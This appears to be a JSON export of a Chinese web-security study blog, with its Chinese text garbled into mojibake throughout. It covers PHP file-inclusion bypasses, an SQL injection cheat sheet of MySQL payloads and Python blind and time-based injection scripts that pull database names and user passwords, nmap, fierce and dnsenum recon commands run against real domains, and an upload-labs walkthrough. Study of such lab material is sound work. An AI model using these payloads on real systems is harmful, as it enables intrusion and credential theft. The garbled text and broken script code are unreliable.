è¯»é…ç½®æ–‡ä»¶æ‰¾æ—¥å¿—è·¯å¾„/etc/httpd/conf/httpd.conf/etc/init.d/httpd # sessionæ–‡ä»¶ PHPSESSIDä¸cookieä¸­æŒ‡å®šçš„PHPSESSIDç›¸å¯¹åº”/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID# è¿™ä¸¤ä¸ªæ–‡ä»¶å­˜ç€æ‰€æœ‰æ–‡ä»¶çš„è·¯å¾„ï¼Œéœ€è¦rootæƒé™/var/lib/locate.db/var/lib/mlocate/mlocate.db ç»•è¿‡æ€è·¯ ç»•è¿‡æ–‡ä»¶è·¯å¾„é™åˆ¶ ../è¿›è¡Œæ‹¼æ¥ ç»•è¿‡../è¿‡æ»¤ ç¼–ç  URLç¼–ç  äºŒæ¬¡URLç¼–ç  ç»•è¿‡æ–‡ä»¶ååç¼€æŒ‡å®š 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include $file.&#x27;/test/test.php&#x27;;?&gt; æ–‡ä»¶ååæ·»åŠ  # ï¼Œè¯¦æƒ…è§dvwa-æ–‡ä»¶åŒ…å« mediumå…³ psï¼šå³å¦‚æœåœ¨URLååŠ äº†#ï¼Œåé¢çš„å†…å®¹ä¸ä¼šæäº¤ç»™æœåŠ¡å™¨æ ¡éªŒ ç»•è¿‡åç¼€ - é•¿åº¦æˆªæ–­ ä¸åœçš„å¢åŠ ../.././ 1?file=../../.../../.../../../../../../../../../../ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚/shell.txt åœ¨linuxä¸­è¾¾åˆ°4096å­—èŠ‚ï¼ŒWindowsä¸­256å­—èŠ‚æ—¶ï¼Œä¼šè‡ªåŠ¨ä¸¢å¼ƒåé¢å¤šä½™çš„éƒ¨åˆ† é˜²å¾¡ è¿‡æ»¤æ•æ„Ÿå­—ç¬¦ è®¾ç½®open_basedirï¼ŒæŒ‡å®šå¯ä»¥è¿›è¡ŒåŒ…å«çš„ç›®å½•è·¯å¾„ https://www.cnblogs.com/iamstudy/articles/include_file.html https://chybeta.github.io/2017/10/08/phpæ–‡ä»¶åŒ…å«æ¼æ´/","categories":[],"tags":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SQLæ³¨å…¥æ€»ç»“","slug":"sqlæ³¨å…¥æ€»ç»“","date":"2019-07-24T16:00:00.000Z","updated":"2021-10-22T08:33:06.570Z","comments":true,"path":"2019/07/25/sqlæ³¨å…¥æ€»ç»“/","link":"","permalink":"http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"â€¦.","text":"â€¦. å›æ˜¾æ³¨å…¥ åŸç†ï¼šwebé¡µé¢å¯¹åç«¯è¿”å›çš„ä¿¡æ¯æ²¡åšè¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®åº“ç›¸å…³æŠ¥é”™ä¿¡æ¯æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š ä¸€èˆ¬æ€§æ­¥éª¤ åˆ©ç”¨ç‚¹æ˜¯å¦å­˜åœ¨SQL æ³¨å…¥ï¼ˆæ¶æ„è¾“å…¥ä¸æ­£å¸¸è¾“å…¥é¡µé¢åšå¯¹æ¯”ï¼‰ è·å–æ•°æ®åº“ç±»å‹ã€ç‰ˆæœ¬ åˆ¤æ–­æ•°æ®è¡¨å­—æ®µæ•° order by åˆ¤æ–­å›æ˜¾ä½ç½® union select payloadä»¥mysqlä¸ºä¾‹ï¼š åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ 12http://test.com?id=1&#x27; // æŠ¥é”™è¯­å¥http://test.com?id=1&#x27; or 1=1 -- - //æˆåŠŸæ‰§è¡Œ åˆ¤æ–­å­—æ®µæ•° 12http://test.com?id=1&#x27; order by 3-- -http://test.com?id=1&#x27; order by 4-- - //æŠ¥é”™ åˆ¤æ–­å›æ˜¾ä½ç½® 1http://test.com?id=-1&#x27; union select 1,2,3-- - è·å–æ•°æ®åº“ç‰ˆæœ¬ 1http://test.com?id=-1&#x27; union select 1,version(),3-- - è·å–æ•°æ®åº“å 1http://test.com?id=-1&#x27; union select 1,database(),3-- - è·å–æ•°æ®è¡¨ 1http://test.com?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3-- - è·å–æ•°æ®è¡¨çš„å­—æ®µå 1http://test.com?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 -- - è·å–ç”¨æˆ·åå’Œå¯†ç  1http://test.com?id=-1&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) -- - å¸ƒå°”ç›²æ³¨ä¸»è¦å‡½æ•° left(str,len)ï¼šè·å–å‚æ•°strä»æœ€å·¦è¾¹å¼€å§‹çš„å‰lenä¸ªå­—ç¬¦ ascii()ï¼šè·å–å‚æ•°çš„asciiç  ord()ï¼šè·å–å‚æ•°çš„asciiç  if(expr1,expr2,expr3)ï¼š expr1ï¼šåˆ¤æ–­æ¡ä»¶ expr2ï¼šæ¡ä»¶æˆç«‹æ—¶è¿”å›çš„ç»“æœ expr3ï¼šæ¡ä»¶ä¸æˆç«‹æ—¶è¿”å›çš„ç»“æœ substr(str,pos,len)ï¼šä»ç¬¬posä¸ªå­—ç¬¦å¼€å§‹ï¼Œæˆªå–lenä¸ªå­—ç¬¦ è„šæœ¬å®ä¾‹123456789101112131415161718192021222324252627282930313233343536import requestszidian = &#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\\;&#123;$%&amp;*()&#125;&#x27;url = &quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;def get_dbname(): for i in range(1,10): for j in zidian: print(j) #è·å–æ•°æ®åº“å payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) #è·å–æ•°æ®è¡¨å æ§åˆ¶limitè·å–å…¶ä»–è¡¨ #payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) #è·å–å­—æ®µå #payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;è¡¨å&#x27; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) #è·å–å­—æ®µå€¼ #payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from è¡¨å limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) print(payload) flag = requests.get(payload) if &quot;You are in&quot; in flag.text: res += j print(res)get_res() æ—¶é—´ç›²æ³¨ç›¸å…³å‡½æ•° sleep(x)ï¼šæ•°æ®åº“æ²‰ç¡xç§’è¿”å›ç»“æœ benchark(expr1,expr2)ï¼šå°†expr2è¿™ä¸ªè¡¨è¾¾å¼æ‰§è¡Œexpr1æ¬¡ benchmark(1000,md5(1))ï¼šå°†1è¿›è¡ŒMD5åŠ å¯†1000æ¬¡ è„šæœ¬ç¤ºä¾‹ sleep 123456789101112131415161718192021import requestsimport timedbname = &#x27;&#x27;zidian=&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;for j in range(1,7): for i in zidian: # ä¿®æ”¹æ­¤å¤„è·å–æ•°æ®è¡¨ã€å­—æ®µç­‰å€¼ url=&quot;http://222.18.158.254:4609/?id=1 and if(asci(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,sleep(5),1)&quot;.format(str(j),ord(i)) # t1 = time.time() a=requests.get(url) # t2 = time.time() # total_time = t2 - t1 if(a.elapsed.total_seconds()&gt;=5): print url print &quot;succeess&quot; dbname = dbname+i print dbnameprint dbname benchmark 123456789101112131415161718import requestsimport timedbname = &#x27;&#x27;zidian=&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;for j in range(1,7): for i in zidian: url=&quot;http://222.18.158.254:4610/?id=1 and if(ascii(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,benchmark(1e5,md5(1)),1)&quot;.format(str(j),i) a=requests.get(url) if(a.elapsed.total_seconds()&gt;=1.5): print url print &quot;succeess&quot; dbname = dbname+i print dbnameprint dbname æŠ¥é”™æ³¨å…¥ åŸç†ï¼šåˆ©ç”¨æ•°æ®åº“çš„æŠ¥é”™æœºåˆ¶ï¼Œäººä¸ºçš„åˆ¶é€ é”™è¯¯ä¿¡æ¯å¹¶å°†ä¿¡æ¯æ˜¾ç¤ºåˆ°ç³»ç»Ÿæç¤ºçš„é”™è¯¯ä¸­ floor æ¨¡æ¿ 1select 1,count(*),concat(æŸ¥è¯¢è¯­å¥,floor(rand()*2))a from information_schema.tables group by a è·å–æ•°æ®åº“ 1select 1,count(*),concat(database(),floor(rand()*2))a from information_schema.tables group by a è·å–æ•°æ®è¡¨ æ§åˆ¶imitå¯è·å–å…¶ä»–è¡¨å 1select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.columns group by a extractvalue()æ¨¡æ¿ 1extractvalue(1, concat(0x25, (æŸ¥è¯¢è¯­å¥))) è·å–æ•°æ®åº“å 1select * from news where id=1 and extractvalue(1, concat(0x25, (select database() from information_schema.tables limit 0,1))) è·å–æ•°æ®åº“è¡¨ 12select * from news where id=1 and extractvalue(1, concat(0x25, (select table_name from information_schema.tables where table_schema=database() limit 0,1)))æ§åˆ¶limitå¾—åˆ°å…¶ä»–è¡¨ è·å–æ•°æ®åº“è¡¨çš„å­—æ®µå 1select * from news where id=1 and extractvalue(1, concat(0x25, (select column_name from information_schema.columns where table_name=&#x27;è¡¨å&#x27; limit 0,1))) è·å–å­—æ®µå€¼ 1select * from news where id=1 and extractvalue(1, concat(0x25, (select å­—æ®µå from æ•°æ®åº“å.è¡¨å limit 0,1))) updatexml()æ¨¡æ¿ 1updatexml(0x7e,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e),0x7e) è·å¾—æ•°æ®åº“ 1updatexml(0x7e,concat(0x7e,(select database() from information_schema.tables limit 0,1),0x7e),0x7e) è·å–æ•°æ®åº“è¡¨ 1updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e),0x7e) è·å–è¡¨çš„å­—æ®µå 1updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;è¡¨å&#x27; ),0x7e),0x7e) è·å–å­—æ®µå€¼ 1updatexml(0x7e,concat(0x7e,(select group_concat(id) from flag ),0x7e),0x7e) æ­¤å¤–è¿˜æœ‰äºŒæ¬¡æ³¨å…¥ï¼Œå †å æ³¨å…¥ç­‰ å†™shell select into outfile å‰æï¼šéœ€çŸ¥é“ç‰©ç†è·¯å¾„ ,secure_file_priv = on @@basedir phpinfo() phpmyadminï¼šæ—¥å¿—æ¼æ´ general log general log file ç»•è¿‡å§¿åŠ¿ åŒå†™ç»•è¿‡ å¤§å°å†™ç»•è¿‡ å†…è”æ³¨é‡Š || &amp;&amp; ç»•è¿‡and or ç¼–ç ç»•è¿‡ hexç¼–ç  asciiç¼–ç ","categories":[],"tags":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"kaliä¸‹çš„ä¿¡æ¯æ”¶é›†å·¥å…·å­¦ä¹ ","slug":"kaliä¸‹ä¿¡æ¯æ”¶é›†","date":"2019-07-07T16:00:00.000Z","updated":"2021-10-22T08:33:36.344Z","comments":true,"path":"2019/07/08/kaliä¸‹ä¿¡æ¯æ”¶é›†/","link":"","permalink":"http://example.com/2019/07/08/kali%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"-","text":"- nmapnmapæ˜¯ä¸€æ¬¾ç«¯å£æ‰«æç¥å™¨ã€‚ åˆ—ä¸¾å¸¸ç”¨çš„å‡ ç§ç”¨æ³• å¸¸ç”¨æŒ‡ä»¤ nmap -sP IP //æŸ¥çœ‹ä¸€ä¸ªä¸»æœºæ˜¯å¦åœ¨çº¿ nmap IP //æŸ¥çœ‹ä¸€ä¸ªä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£ nmap -sV -O IP //åˆ¤æ–­ç›®æ ‡æ“ä½œç³»ç»Ÿç±»å‹ nmap -sS IP //åŠå¼€æ”¾synæ‰«æ nmap -p 1-1000 IP //æ‰«ææŒ‡å®šç«¯å£èŒƒå›´ nmap -p 80 IP //æ‰«æç‰¹å®šç«¯å£ nmap -sV IP //æŸ¥çœ‹ç›®æ ‡å¼€æ”¾ç«¯å£å¯¹åº”çš„åè®®åŠç‰ˆæœ¬ä¿¡æ¯ ä¸‰ä¸ªåˆ¤æ–­é˜²ç«å¢™çš„æ‰«æ nmap -sF IP nmap -sA IP nmap -sW IP //ACK,æ¢æµ‹é˜²ç«å¢™æ‰«æ å…¶ä»–å‚æ•° -sT å…¨è¿æ¥æ‰«æï¼Œæ›´æ…¢ï¼Œä¼šè¢«æœåŠ¡å™¨è®°å½•æ—¥å¿—ï¼Œä½†ä¸æ˜“è¢«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿæ£€æµ‹åˆ° -Pn è·³è¿‡Pingæµ‹è¯•(é˜²ç«å¢™)ï¼Œæ‰«ææŒ‡å®šç›®æ ‡ -v è¯¦ç»†æ¨¡å¼Vè¶Šå¤šå°±è¶Šè¯¦ç»† -p 80 pingæŒ‡å®šç«¯å£ â€“script=script_name ä½¿ç”¨è„šæœ¬ è„šæœ¬åˆ—è¡¨http://nmap.org/nsedoc/scripts/ è„šæœ¬ä½¿ç”¨å®ä¾‹ï¼š nmap â€“script=auth IP //è´Ÿè´£å¤„ç†é‰´æƒè¯ä¹¦ï¼ˆç»•å¼€é‰´æƒï¼‰çš„è„šæœ¬,ä¹Ÿå¯ä»¥ä½œä¸ºæ£€æµ‹éƒ¨åˆ†åº”ç”¨å¼±å£ä»¤ http-php-version //è·å¾—PHPç‰ˆæœ¬ä¿¡æ¯ Http-enum //æšä¸¾Webç«™ç‚¹ç›®å½• smtp-strangeport //åˆ¤æ–­SMTPæ˜¯å¦è¿è¡Œåœ¨é»˜è®¤ç«¯å£ dns-blacklist //å‘ç°IPåœ°å€é»‘åå• nmap â€“script=vuln 192.168.137.* //æ‰«æå¸¸è§æ¼æ´ smb-check-vulns //æ£€æµ‹smbæ¼æ´ samba-vuln-cve-2012-1182 //æ‰«æSambaå †æº¢å‡ºæ¼æ´ æµ‹è¯•WAFæ˜¯å¦å­˜åœ¨ nmap -p 80,443 â€“script=http-waf-detect 192.168.0.100 nmap -p 80,443 â€“script=http-waf-fingerprint www.victom.com å®è·µæ‰«æè‡ªå·±ç½‘æ®µä¸‹çš„Cæ®µç½‘ç»œ é€‰å–ä¸€ä¸ªipè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼ŒæŸ¥çœ‹å“ªäº›ç«¯å£å¤„äºå¼€æ”¾ æŸ¥çœ‹80ç«¯å£æ˜¯å¦å¼€æ”¾ ç­‰ç­‰ç­‰ dmitryDMitryï¼ˆDeepmagic Information Gathering Toolï¼‰æ˜¯ä¸€ä¸ªä¸€ä½“åŒ–çš„ä¿¡æ¯æ”¶é›†å·¥å…·ã€‚å®ƒå¯ä»¥ç”¨æ¥æ”¶é›†ä»¥ä¸‹ä¿¡æ¯ï¼š æ ¹æ®IPï¼ˆæˆ–åŸŸåï¼‰æ¥æŸ¥è¯¢ç›®æ ‡ä¸»æœºçš„Whoisä¿¡æ¯ åœ¨Netcraft.comçš„ç½‘ç«™ä¸ŠæŒ–æ˜ä¸»æœºä¿¡æ¯ æŸ¥æ‰¾ç›®æ ‡åŸŸä¸­ç”¨çš„å­åŸŸ æŸ¥æ‰¾ç›®æ ‡åŸŸçš„ç”µå­é‚®ä»¶åœ°å€ æ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šæ‰“å¼€çš„ç«¯å£ã€è¢«å±è”½çš„ç«¯å£å’Œå…³é—­çš„ç«¯å£ å‚æ•° dmtry -h 123456789101112131415161718192021 -o //å°†è¾“å‡ºä¿å­˜åˆ°ï¼…host.txtæˆ–ç”±-oæ–‡ä»¶æŒ‡å®šçš„æ–‡ä»¶ -i //å¯¹ä¸»æœºçš„IPåœ°å€æ‰§è¡ŒwhoisæŸ¥æ‰¾ -w //å¯¹ä¸»æœºçš„åŸŸåæ‰§è¡ŒwhoisæŸ¥æ‰¾ -n //åœ¨ä¸»æœºä¸Šæ£€ç´¢Netcraft.comä¿¡æ¯ -s //æ‰§è¡Œæœç´¢å¯èƒ½çš„å­åŸŸ -e //æ‰§è¡Œæœç´¢å¯èƒ½çš„ç”µå­é‚®ä»¶åœ°å€ -p //åœ¨ä¸»æœºä¸Šæ‰§è¡ŒTCPç«¯å£æ‰«æ\\* -f //åœ¨æ˜¾ç¤ºè¾“å‡ºæŠ¥å‘Šè¿‡æ»¤ç«¯å£çš„ä¸»æœºä¸Šæ‰§è¡ŒTCPç«¯å£æ‰«æ\\* -b //è¯»å–ä»æ‰«æç«¯å£æ¥æ”¶çš„banner\\* -t 0-9 //0-9æ‰«æTCPç«¯å£æ—¶è®¾ç½®TTLï¼ˆé»˜è®¤ä¸º2ï¼‰*Requires the -p flagged to be passed //*æ ‡è®°çš„æŒ‡ä»¤éœ€è¦-pæ ‡è®°æ‰èƒ½ä¼ é€’ å®è·µ1dmitry -p baidu.com -f -b fiercefierceæ˜¯RSnakeåˆ›ç«‹çš„å¿«é€Ÿæœ‰æ•ˆåœ°DNSæš´åŠ›ç ´è§£å·¥å…·ã€‚fierceå·¥å…·é¦–å…ˆæ ¹æ®åŸŸåçš„IPåœ°å€ï¼ŒæŸ¥è¯¢ç›¸å…³çš„åŸŸåæœåŠ¡å™¨ï¼Œç„¶ååˆ©ç”¨å­—å…¸è¿›è¡Œæ”»å‡» æŸ¥çœ‹å‚æ•° 123456789101112131415161718192021222324252627282930313233343536fierce -hOptions:-connect [header.txt] å¯¹éRFC1918åœ°å€è¿›è¡ŒHTTPè¿æ¥ï¼ˆè€—æ—¶é•¿ã€æµé‡å¤§ï¼‰ï¼Œé»˜è®¤è¿”å›æœåŠ¡å™¨çš„å“åº”å¤´éƒ¨ã€‚å¯é€šè¿‡æ–‡ä»¶æŒ‡å®šHTTPè¯·æ±‚å¤´çš„Hostä¿¡æ¯ï¼Œå¦‚ï¼šfierce -dns example.com -connect headers.txt-delay æŒ‡å®šä¸¤æ¬¡æŸ¥è¯¢ä¹‹é—´çš„æ—¶é—´é—´éš”-dns æŒ‡å®šæŸ¥è¯¢çš„åŸŸå-dnsfile &lt;dnsfile.txt&gt; ç”¨æ–‡ä»¶æŒ‡å®šåå‘æŸ¥è¯¢çš„DNSæœåŠ¡å™¨åˆ—è¡¨-dnsserver æŒ‡å®šç”¨æ¥åˆå§‹åŒ–SOAæŸ¥è¯¢çš„DNSæœåŠ¡å™¨ã€‚ï¼ˆä»…ç”¨äºå‡ºåˆå§‹åŒ–ï¼Œåç»­æŸ¥è¯¢å°†ä½¿ç”¨ç›®æ ‡çš„DNSæœåŠ¡å™¨ï¼‰-file &lt;domain.txt&gt; å°†ç»“æœè¾“å‡ºè‡³æ–‡ä»¶-fulloutput ä¸-connectç»“åˆï¼Œè¾“å‡ºæœåŠ¡å™¨è¿”å›çš„æ‰€æœ‰ä¿¡æ¯-help æ‰“å°å¸®åŠ©ä¿¡æ¯-nopattern ä¸é€‚ç”¨æœç´¢æ¨¡å¼æŸ¥æ‰¾ä¸»æœºã€‚ï¼ˆæ­¤å‚æ•°æš‚æ—¶æ²¡æœ‰ç”¨æ˜ç™½ï¼‰-range &lt;1.1.1.1/24&gt; å¯¹å†…éƒ¨IPèŒƒå›´åšIPåæŸ¥(æ­¤å‚æ•°å°šæœªç”¨æ˜ç™½)ã€‚å¿…é¡»ä¸dnsserverå‚æ•°é…åˆï¼ŒæŒ‡å®šå†…éƒ¨DNSæœåŠ¡å™¨ï¼Œå¦‚ï¼š fierce -range 111.222.333.0-255 -dnsserver ns1.example.com-search æŒ‡å®šå…¶ä»–çš„åŸŸï¼Œåœ¨å…¶ä»–çš„åŸŸå†…è¿›è¡ŒæŸ¥æ‰¾ï¼ˆæ­¤å‚æ•°æ²¡æœ‰ç”¨æ˜ç™½ï¼‰ï¼Œå¦‚ï¼š fierce -dns examplecompany.com -search corpcompany,blahcompany-tcptimeout æŒ‡å®šæŸ¥è¯¢çš„è¶…æ—¶æ—¶é—´-threads [number] æŒ‡å®šæ‰«æçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤å•çº¿ç¨‹-traverse [number] æŒ‡å®šæ‰«æçš„ä¸Šä¸‹IPèŒƒå›´ï¼Œé»˜è®¤æ‰«æä¸Šä¸‹5å„ä¸ªã€‚-version æ‰“å°fierceç‰ˆæœ¬-wide æ‰«æå…¥å£IPåœ°å€çš„Cæ®µã€‚äº§ç”Ÿå¤§æµé‡ã€ä¼šæ”¶é›†åˆ°æ›´å¤šä¿¡æ¯.-wordlist &lt;sub.txt&gt; ä½¿ç”¨æŒ‡å®šçš„å­—å…¸è¿›è¡Œå­åŸŸåçˆ†ç ´ å®è·µæšä¸¾æ–‡ä»¶å†…çš„å­åŸŸåè¿›è¡Œçˆ†ç ´ï¼Œçº¿ç¨‹æ•°ä¸º3ï¼Œå¦‚æœè¦è¾“å‡ºåˆ°æ–‡ä»¶ä¿å­˜ï¼Œåˆ™å¯åœ¨åé¢åŠ ä¸Š-file test.txt 1fierce -dns baidu.com -wordlist dns.txt -threads 3 dnsenumå®ƒå¯ä»¥æŸ¥è¯¢ç½‘ç«™çš„ä¸»æœºåœ°å€ä¿¡æ¯ã€åŸŸåæœåŠ¡å™¨ã€mx recordï¼ˆå‡½ä»¶äº¤æ¢è®°å½•ï¼‰ï¼Œåœ¨åŸŸåæœåŠ¡å™¨ä¸Šæ‰§è¡Œaxfrè¯·æ±‚ï¼Œé€šè¿‡è°·æ­Œè„šæœ¬å¾—åˆ°æ‰©å±•åŸŸåä¿¡æ¯ï¼ˆgoogle hackingï¼‰ï¼Œæå–è‡ªåŸŸåå¹¶æŸ¥è¯¢ï¼Œè®¡ç®—Cç±»åœ°å€å¹¶æ‰§è¡ŒwhoisæŸ¥è¯¢ï¼Œæ‰§è¡Œåå‘æŸ¥è¯¢ï¼ŒæŠŠåœ°å€æ®µå†™å…¥æ–‡ä»¶ã€‚ å‚æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960dnsenum -h--dnsserver &lt;server&gt; //æŒ‡å®šä¸€ä¸ªDNSæœåŠ¡å™¨æŸ¥è¯¢A, NS and MXè®°å½• --enum //ç­‰åŒäº--threads 5 -s 15 -w -h, --help //æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ --noreverse //è·³è¿‡åå‘æŸ¥è¯¢ --nocolor //ç¦æ­¢ADSIColorè¾“å‡º --private //åœ¨æ–‡ä»¶domain_ips.txtçš„æœ«å°¾æ˜¾ç¤ºå¹¶ä¿å­˜ç§æœ‰å¯†ç  --subfile &lt;file&gt; //å°†æ‰€æœ‰æœ‰æ•ˆå­åŸŸå†™å…¥æ­¤æ–‡ä»¶ -t, --timeout &lt;value&gt; //è®¾ç½®tcpå’Œudpè¶…æ—¶å€¼ --threads &lt;value&gt; //è®¾ç½®çº¿ç¨‹æ•° -v, --verbose //æ˜¾ç¤ºæ‰€æœ‰è¿›åº¦å’Œæ‰€æœ‰é”™è¯¯æ¶ˆæ¯.GOOGLE SCRAPING OPTIONS: -p, --pages &lt;value&gt; //æŠ“å–åç§°æ—¶è¦å¤„ç†çš„googleæœç´¢é¡µé¢çš„æ•°é‡ï¼Œé»˜è®¤ä¸º5é¡µï¼Œå¿…é¡»æŒ‡å®š-så¼€å…³ã€‚ -s, --scrap &lt;value&gt; //è¦ä»Googleä¸­åˆ é™¤çš„å­åŸŸçš„æœ€å¤§æ•°é‡BRUTE FORCE OPTIONS: -f, --file &lt;file&gt; //ä»æ­¤æ–‡ä»¶è¯»å–å­åŸŸæ‰§è¡Œæš´åŠ›æšä¸¾ -u, --update &lt;a|g|r|z&gt; //ä½¿ç”¨æœ‰æ•ˆçš„å­åŸŸæ›´æ–°,ä½¿ç”¨-fæŒ‡å®šæ–‡ä»¶ã€‚ a (all) //ä½¿ç”¨æ‰€æœ‰ç»“æœæ›´æ–°ã€‚ g //ä»…ä½¿ç”¨GoogleæŠ“å–ç»“æœæ›´æ–° r //ä»…ä½¿ç”¨åå‘æŸ¥æ‰¾ç»“æœè¿›è¡Œæ›´æ–°ã€‚ z //ä»…ä½¿ç”¨åŒºåŸŸè½¬ç§»ç»“æœè¿›è¡Œæ›´æ–° -r, --recursion //å…è®¸ä½¿ç”¨é€’å½’æŸ¥è¯¢WHOIS NETRANGE OPTIONS: -d, --delay &lt;value&gt; //åœ¨whoisæŸ¥è¯¢ä¹‹é—´ç­‰å¾…çš„æœ€å¤§ç§’æ•°ï¼Œéšæœºå®šä¹‰ä¸º3ç§’ã€‚ -w, --whois //å¯¹cç±»ç½‘ç»œèŒƒå›´æ‰§è¡ŒwhoisæŸ¥è¯¢ // **è­¦å‘Š**ï¼šè¿™å¯ä»¥äº§ç”Ÿéå¸¸å¤§çš„netrangesï¼ŒèŠ±è´¹å¤§é‡çš„æ—¶é—´æ¥æ‰§è¡Œåå‘æŸ¥æ‰¾ã€‚REVERSE LOOKUP OPTIONS: -e, --exclude &lt;regexp&gt; //ä»åå‘æŸ¥æ‰¾ç»“æœä¸­æ’é™¤åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼è¡¨è¾¾å¼çš„PTRè®°å½•ï¼Œè¿™å¯¹æ— æ•ˆä¸»æœºåæœ‰ç”¨ã€‚OUTPUT OPTIONS: -o --output &lt;file&gt; //ä»¥XMLä¿å­˜è¾“å‡ºç»“æœ å®è·µæšä¸¾dnsä¸­çš„å­åŸŸåè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¹¶å°†æœ‰æ•ˆå­åŸŸåå†™å…¥æ–‡ä»¶ï¼Œçº¿ç¨‹è®¾ç½®ä¸º2 1dnsenum -f dns.txt cuit.edu.cn -threads 2 --subfile cuit.txt","categories":[],"tags":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"upload-labsé¶åœºWP","slug":"upload-labs","date":"2019-06-29T16:00:00.000Z","updated":"2021-10-22T08:31:25.582Z","comments":true,"path":"2019/06/30/upload-labs/","link":"","permalink":"http://example.com/2019/06/30/upload-labs/","excerpt":"é¶åœºgithubï¼šhttps://github.com/c0ny1/upload-labs ç…§ç€å¤§ä½¬çš„æ€ç»´å¯¼å›¾å­¦ä¹ ","text":"é¶åœºgithubï¼šhttps://github.com/c0ny1/upload-labs ç…§ç€å¤§ä½¬çš„æ€ç»´å¯¼å›¾å­¦ä¹  PASS-01 ä»£ç  1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; &#125;&#125; åˆ†æï¼š JavaScriptä»£ç è¿›è¡Œå‰ç«¯æ£€æµ‹å¯¹æ–‡ä»¶çš„ä¸Šä¼ åç¼€åè¿›è¡Œäº†é™åˆ¶ ç»•è¿‡æ€è·¯ æŠ“åŒ… pass-02ä»£ç  12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ 